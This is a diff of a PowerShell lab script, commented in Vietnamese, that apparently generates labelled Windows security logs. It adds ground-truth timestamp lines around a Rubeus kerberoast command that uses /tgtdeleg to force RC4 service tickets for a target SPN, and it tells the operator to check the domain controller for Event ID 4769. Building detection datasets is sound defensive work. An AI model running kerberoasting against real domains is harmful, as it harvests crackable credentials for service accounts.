@@ -35,10 +35,17 @@ if (-not (Test-Path $Rubeus)) {
     return
 }
 
+# Ghi moc ground truth ra CSV de gan nhan .evtx
+$GtFile = "C:\ground_truth.csv"
+if (-not (Test-Path $GtFile)) { "timestamp,scenario,phase" | Set-Content -Path $GtFile -Encoding UTF8 }
+"$(Get-Date -Format 'o'),SC2-2A,START" | Add-Content -Path $GtFile
+
 # Chi dung /tgtdeleg de ha cap RC4 0x17 tren account co bat RC4. KHONG dung /rc4opsec
 # vi /rc4opsec loc BO cac account da bat AES (tuc la bo qua dung SVC_HIS_Database) -> khong sinh 0x17.
 # Kiem chung lai o Rubeus README truoc khi chay (muc kerberoast /tgtdeleg vs /rc4opsec).
 & $Rubeus kerberoast /tgtdeleg /spn:$Spn /nowrap | Out-Null
+
+"$(Get-Date -Format 'o'),SC2-2A,END" | Add-Content -Path $GtFile
 
 Write-Host "    KET THUC: $(Get-Date -Format 'o')" -ForegroundColor Yellow
 Write-Host "[+] [SC2-2A] Xong. Kiem tra DC01 -> Security log -> Event ID 4769, TicketEncryptionType 0x17." -ForegroundColor Green
